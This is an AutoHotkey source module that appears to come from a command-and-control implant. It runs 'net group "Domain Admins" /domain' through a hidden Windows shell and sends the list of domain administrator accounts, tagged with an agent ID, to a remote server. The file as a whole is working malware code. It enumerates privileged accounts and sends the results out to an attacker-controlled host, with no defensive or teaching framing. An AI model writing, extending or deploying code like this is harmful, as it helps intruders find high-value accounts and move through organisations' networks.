; ============================================================================
; IDENTIFY DOMAIN ADMINS MODULE
; ============================================================================
; Lists members of the Domain Admins group
; ============================================================================

IdentifyDomainAdmins() {
    comspec := EnvGet("ComSpec")

    try {
        ; Execute the domain admins query and capture output
        shell := ComObject("WScript.Shell")
        exec := shell.Exec(comspec . ' /c net group "Domain Admins" /domain')
        output := exec.StdOut.ReadAll()

        ; Format the data with header
        data := "Domain Admins:`n"
        data .= "----------------------------------------`n"
        data .= output

        ; Send results to server
        message := Format("command_output|{}|{}", this.agentID, data)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

    } catch Error as err {
        errorMsg := "Error retrieving Domain Admins information: " . err.Message
        message := Format("command_output|{}|{}", this.agentID, errorMsg)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }
}
